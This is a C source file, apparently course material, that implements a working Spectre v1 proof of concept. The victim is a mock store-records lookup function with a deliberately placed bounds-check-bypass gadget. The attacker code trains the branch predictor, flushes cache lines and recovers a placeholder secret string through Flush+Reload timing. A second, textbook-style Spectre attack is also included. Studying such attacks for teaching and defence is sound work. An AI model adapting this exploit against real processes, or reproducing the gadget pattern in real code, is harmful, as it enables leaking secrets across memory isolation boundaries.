#include "../inline_asm.h"
#include "../color.h"
#include <assert.h>
#include <ctype.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define PAGE_SIZE 4096
#define CACHE_LINE_SIZE 64
#define SYMBOL_CNT (1 << (sizeof(char) * 8))

// The secret information
const char *secret = "The cake is a lie!";

// ====== A set of helper functions ======
// Calibrate the threshold for cache misses/hits
uint64_t calibrate_latency() {
    uint64_t hit = 0, miss = 0, threshold, rep = 1000;
    uint8_t *data = malloc(8);
    assert(data); // Lazy "exception" handling

    // Measure cache hit latency
    _maccess(data);
    for (uint32_t n = 0; n < rep; n++) {
        uint64_t start = _timer_start();
        _maccess(data);
        hit += _timer_end() - start;
    }
    hit /= rep;

    // Measure cache miss latency
    for (uint32_t n = 0; n < rep; n++) {
        _mm_clflush(data);
        uint64_t start = _timer_start();
        _maccess(data);
        miss += _timer_end() - start;
    }
    miss /= rep;

    threshold = ((2 * miss) + hit) / 3;
    printf("Avg. hit latency: %" PRIu64 ", Avg. miss latency: %" PRIu64
           ", Threshold: %" PRIu64 "\n",
           hit, miss, threshold);
    free(data);
    return threshold;
}

// Branchless select based on the predicate (covered in class)
inline size_t csel(size_t T, size_t F, bool pred) {
    size_t mask = -(size_t)(!!pred); // Need to collapse "pred" to 0/1
    return (T & mask) | (F & ~mask);
    // return F ^ ((T ^ F) & mask);  // This also works and should be a bit faster
}

// Flush "N" lines from address "start" with a stride of "stride"
void flush_lines(void *start, size_t stride, size_t N) {
    for (size_t c = 0; c < N; c++) {
        _mm_clflush(start + stride * c);
    }
}

// Find the most hit cacheline and safely decode its character
void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
    uint64_t most_hits = 0, scd_most_hits = 0;
    unsigned char raw_c = '\0', scd_raw_c = '\0';
    for (size_t i = 0; i < cnt && i < SYMBOL_CNT; i++) {
        if (most_hits < hits[i]) {
            scd_most_hits = most_hits;
            scd_raw_c = raw_c;

            most_hits = hits[i];
            raw_c = i;
        }
    }

    *c = isprint(raw_c) ? raw_c : '?';
    char scd_c = isprint(scd_raw_c) ? scd_raw_c : '?';
    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3lu); "
           "2nd best guess: '%c' (ASCII=%#4x, #hits=%3lu)\n",
           *c, *c, most_hits, scd_c, scd_raw_c, scd_most_hits);
}
// ====== End of helper functions ======

// ====== Business ======
typedef struct {
    uint8_t item_type;
    char item_name[64];
    char item_desc[447];
} Item; // 512B

typedef struct {
    uint8_t item_id;
} Order; // 1B, so convenient for the attacker

typedef struct {
    Item *items;  /* bytes 0-7 */
    Order *orders; /* bytes 8-15 */
    char memo[512]; /* bytes 16-527 */
    size_t num_orders; /* bytes 528-535 */
    size_t num_items; /* bytes 536-533 */
    char manager[256]; /* bytes 536-791 */
} SalesRecords;
/* Why do we need the memo and manager fields? This is because we need to
flush "num_orders" and "num_items" from the cache, yet we require the pointers
to items and orders to remain cached. "memo" provides enough padding
such that "num_orders" and "num_items" do no co-locate with the two pointers
on the same cache line. We also need the padding from the "manager" field
because otherwise "num_orders" and "num_items" may share a cache line with
other memory allocations---e.g., the item array---depending on the memory
allocator details. (This actually happened when I was playing with it.)
When this happens, reading "num_orders" also brings the first few bytes
of the first item into the cache, polluting the Flush+Reload results.
If this confuses you, see the illustration below:

Memory layout if SalesRecords does NOT have the "manager field"
|------------------------------ Cache line -------------------------------|
|End of memo][num_orders][num_items ]|[First item from the item array.....|
0            16           24         |32                                 63
             End of the SalesRecords-|

Reading "num_orders" and "num_items" also brings the beginning part of
the first item into the cache. */

#define MAX_NUM_ITEMS 256 // A convenient number of items for the attacker!
#define NUM_ORDERS 4
#define NUM_ITEMS 4

SalesRecords *init_sales_records() {
    SalesRecords *recs = calloc(1, sizeof(SalesRecords));
    Item *items = calloc(MAX_NUM_ITEMS , sizeof(Item));
    Order *orders = calloc(NUM_ORDERS, sizeof(Order));
    assert(recs && items && orders); // A lazy sanity check, don't do this in practice

    // Fill the memory region with placeholder zeros, forcing page allocation
    memset(items, 0, sizeof(Item) * MAX_NUM_ITEMS);
    memset(orders, 0, sizeof(Order) * NUM_ORDERS);

    items[0] = (Item){.item_type=1, .item_name="Lemon", .item_desc="Make some lemonade"};
    items[1] = (Item){.item_type=1, .item_name="Cake",  .item_desc="Black forest cake"};
    items[2] = (Item){.item_type=2, .item_name="Book",  .item_desc="Useful for enchanting"};
    items[3] = (Item){.item_type=3, .item_name="Beer",  .item_desc="Cheers!"};
    // 252 more placeholder items

    orders[0].item_id = 2;
    orders[1].item_id = 1;
    orders[2].item_id = 3;
    orders[3].item_id = 2;
    // Poor store, not many orders

    *recs = (SalesRecords){.items = items,
                           .orders = orders,
                           .memo = "The best science is done with a little bit "
                                   "of crazy and a whole lot of duct tape",
                           .num_orders = NUM_ORDERS,
                           .num_items = NUM_ITEMS,
                           .manager = "Cave Johnson"};
    return recs;
}

void free_sales_records(SalesRecords *records) {
    if (records) {
        free(records->items);
        free(records->orders);
        free(records);
    }
}

// An unsuspecting business logic containing a Spectre gadget!
uint8_t lookup_item_id(SalesRecords *recs, size_t order_id) {
    if (order_id < recs->num_orders) {
        uint8_t item_id = recs->orders[order_id].item_id; // Access load
        if (item_id < recs->num_items) {
            return recs->items[item_id].item_type; // Transmit load
        }
    }
    return 0; // Invalid item
}

// ====== The evil attacker code ======
#define REP 100 // Number of repetitions to de-noise the channel
#define TRAINING_EPOCH 16 // 15 in-bound accesses then 1 out-of-bound access
#define BUF_SIZE 20

void attacker(SalesRecords *records) {
    uint64_t threshold = calibrate_latency();
    printf("-----------------------------------------\n");
    uint64_t hits[MAX_NUM_ITEMS] = { 0 };
    char buf[BUF_SIZE] = { '\0' };

    uint8_t *array_base = &records->orders[0].item_id;
    size_t malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
    printf("Secret address: %p, Array address: %p\n", secret, array_base);
    printf("The malicious index is %p-%p=%#lx\n", secret, array_base,
           malicious_index);
    printf("-----------------------------------------\n");

    for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE - 1; c++) {
        for (size_t r = 0; r < REP; r++) {
            for (size_t t = 0; t < TRAINING_EPOCH; t++) {
                // We use an in-bound index for the first TRAINING_EPOCH - 1
                // iterations and switch to the malicious index
                // for the last iteration
                bool is_attack = (t % TRAINING_EPOCH == TRAINING_EPOCH - 1);
                size_t index = csel(malicious_index + c, 0, is_attack);

                // The "Flush" part of Flush+Reload
                // Can be replaced with Prime+Probe
                flush_lines(records->items, sizeof(Item), MAX_NUM_ITEMS);

                // Flush num_orders and num_items to delay branch resolution
                // Can be replaced with eviction using an eviction set
                _mm_clflush(&records->num_orders);
                _mm_clflush(&records->num_items);

                // Ensure clflushes are finished
                _mm_mfence();
                _mm_lfence();

                // Call the victim function and prevent compiler optimizations
                _no_opt(lookup_item_id(records, index));
            }

            for (size_t i = 0; i < MAX_NUM_ITEMS; i++) {
                // A clever hack to traverse [0, 255] in an unpredictable order
                // to confuse the prefetcher
                size_t idx = (i * 167 + 13) % MAX_NUM_ITEMS;

                // The "Reload" part of Flush+Reload
                // Can be replaced with Prime+Probe
                uint8_t *ptr = &records->items[idx].item_type;
                hits[idx] += (_time_maccess(ptr) <= threshold);
            }
        }

        // Save the recovered character
        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
        memset(hits, 0, sizeof(hits)); // Reset hit counts
    }

    printf("Recovered secret: \"%s\"\n", buf);
    return;
}

// ====== Below is a common Spectre "PoC" ======
uint8_t array[8] = {0, 1, 2, 3, 4, 5, 6, 7};
volatile size_t array_size = 8;

int naive_victim(uint8_t *pages, size_t idx, size_t stride) {
    if (idx < array_size) {
        return pages[array[idx] * stride];
    }
    return 0;
}

void naive_attacker() {
    uint64_t threshold = calibrate_latency();
    printf("-----------------------------------------\n");
    uint64_t hits[SYMBOL_CNT] = { 0 };
    char buf[BUF_SIZE] = { '\0' };

    // Pages for Flush+Reload
    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pages == MAP_FAILED) {
        perror("mmap");
        return;
    }
    memset(pages, 1, PAGE_SIZE * SYMBOL_CNT);
    size_t stride = PAGE_SIZE;

    size_t malicious_index = (uintptr_t)secret - (uintptr_t)array;
    printf("Secret address: %p, Array address: %p\n", secret, array);
    printf("The malicious index is %p-%p=%#lx\n", secret, array,
           malicious_index);
    printf("-----------------------------------------\n");

    for (size_t c = 0; c < strlen(secret); c++) {
        for (size_t r = 0; r < REP; r++) {
            for (size_t t = 0; t < TRAINING_EPOCH; t++) {
                bool is_attack = (t % TRAINING_EPOCH == TRAINING_EPOCH - 1);
                size_t index = csel(malicious_index + c, 0, is_attack);

                flush_lines(pages, stride, SYMBOL_CNT);
                _mm_clflush((void *)&array_size);
                _mm_mfence();
                _mm_lfence();
                _no_opt(naive_victim(pages, index, stride));
            }

            for (size_t i = 0; i < SYMBOL_CNT; i++) {
                size_t idx = (i * 167 + 13) % SYMBOL_CNT;
                uint8_t *ptr = pages + stride * idx;
                hits[idx] += _time_maccess(ptr) < threshold;
            }
        }

        // Save the recovered character
        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
        memset(hits, 0, sizeof(hits));
    }

    printf("Recovered secret: \"%s\"\n", buf);
    munmap(pages, PAGE_SIZE * SYMBOL_CNT);
    return;
}

int main(int argc, char **argv) {
    if (argc == 2 && strcmp(argv[1], "naive") == 0) {
        printf(YELLOW_F "Using a naive Spectre PoC\n" RESET_C);
        naive_attacker();
    } else {
        SalesRecords *records = init_sales_records();
        attacker(records);
        free_sales_records(records);
    }
    return 0;
}
